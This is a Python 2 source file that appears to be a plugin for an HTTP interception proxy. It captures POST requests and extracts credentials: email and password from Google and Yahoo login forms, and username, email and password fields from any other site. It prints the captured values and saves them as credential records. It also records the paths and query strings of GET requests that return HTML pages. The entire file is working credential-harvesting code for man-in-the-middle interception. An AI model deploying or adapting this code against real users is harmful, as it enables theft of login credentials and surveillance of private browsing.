from base import *

class PostMethod(Catcher):
    def __init__(self):
        super(PostMethod, self).__init__(methods=['POST'])
    
    @catcher
    def any_post_data(self, flow):
        q = flow.request
        print "POST {0} {1}".format(q.host, q.path)

        data = self.guess_post_data(q)
        if data is None:
            return 0

        # is it login?
        fact = self.is_login(q, data)

        # try to save the data anyway
        if fact is None:
            fact = {
                'kind': 'postdata',
                'content': data.data,
            }

        self.save(flow, fact)
        return 1


    def is_login(self, req, data):
        if req.host == "accounts.google.com":
            if 'Passwd' in data.data:
                fact  = {'kind': 'cred',
                         'id': data.val('Email'),
                         'email': data.val('Email'),
                         'password': data.val('Passwd'),
                         'provider': 'google'
                     }
                print "GOOGLE CRED", fact
                return fact
        
        elif req.host == "login.yahoo.com":
            if 'passwd' in data.data:
                fact = {'kind': 'cred',
                        'id': data.val('username'),
                        'email': data.val('username') + '@yahoo.com',
                        'password': data.val('passwd'),
                        'provider': 'yahoo'
                    }
                return fact
        else:
            password = None
            username = None
            email = None
            for k in data.data:
                if k.lower() in ['pass', 'passwd', 'password']:
                    password = data.val(k)
                    continue
                if k.lower() in ['user','username','login']:
                    username = data.val(k)
                    continue
                if k.lower() in ['email','mail']:
                    email = data.val(k)
                    continue

            if password or username or email:
                fact = {'kind': 'cred',
                        'id': username,
                        'email': email,
                        'password': password,
                        'provider': req.host
                        }
                print "Found credential:", fact
                return fact


class Get(Catcher):
    def __init__(self):
        super(Get, self).__init__(methods=['GET'])
    
    @catcher
    def save_url_and_query(self, flow):
        if not self.is_content_type(flow.response, 'text/html'):
            return 
        gd = GetData(flow.request.path)
        fact = {
            'path': gd.path,
            'query': gd.data,
            'kind':'get'
        }
        self.save(flow, fact)
        
